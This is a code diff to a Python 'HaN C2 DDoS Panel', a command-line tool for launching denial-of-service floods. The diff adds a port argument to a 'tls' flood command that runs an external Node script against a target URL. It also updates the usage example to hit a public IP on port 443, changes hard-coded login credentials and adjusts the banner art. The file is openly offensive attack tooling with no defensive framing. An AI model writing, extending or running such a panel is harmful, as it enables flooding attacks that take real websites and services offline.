@@ -227,9 +227,9 @@ def menu():
                 \x1b[38;2;0;212;14m║          \x1b[38;2;239;239;239mWelcome to HaN C2 DDoS Panel        \x1b[38;2;0;49;147m║
                 \x1b[38;2;0;212;14m║ \x1b[38;2;0;49;147m- - - - - - \x1b[38;2;239;239;239mFree DDoS Panel 2022\x1b[38;2;0;212;14m- - - - - - -\x1b[38;2;0;49;147m║
                 \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
-                    \x1b[38;2;0;212;14m╔═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╗
+                    \x1b[38;2;0;212;14m╔═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m═════════╗
                     \x1b[38;2;0;212;14m║ \x1b[38;2;239;239;239mhttps://github.com/HanWebsite/c2Hanggar \x1b[38;2;0;49;147m║
-                    \x1b[38;2;0;212;14m╚═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╝
+                    \x1b[38;2;0;212;14m╚═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m═════════╝
                 \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
                 \x1b[38;2;0;212;14m║   \x1b[38;2;239;239;239m   Type help to see the all commands.      \x1b[38;2;0;49;147m║
                 \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
@@ -469,11 +469,12 @@ def main():
         elif "tls" in cnc:
             try:
                 url = cnc.split()[3]
-                time = cnc.split()[4] 
-                os.system(f'node tls.js {url} {time} 2048')
+                port = cnc.split()[4]
+                time = cnc.split()[5] 
+                os.system(f'node tls.js {url} {port} {time} 2000')
             except IndexError:
                 print('Usage: tls <url> <time>')
-                print('Example: tls https://1.1.1.1 60')
+                print('Example: tls https://1.1.1.1 443 60')
     
         elif "https-spoof" in cnc:
             try:
@@ -774,8 +775,8 @@ CLEAR   ► CLEAR TERMINAL
 
 def login():
     clear()
-    user = "HanC2"
-    passwd = "HanC2"
+    user = "Han"
+    passwd = "Han"
     username = input("⚡ Username: ")
     password = getpass.getpass(prompt='⚡ Password: ')
     if username != user or password != passwd:
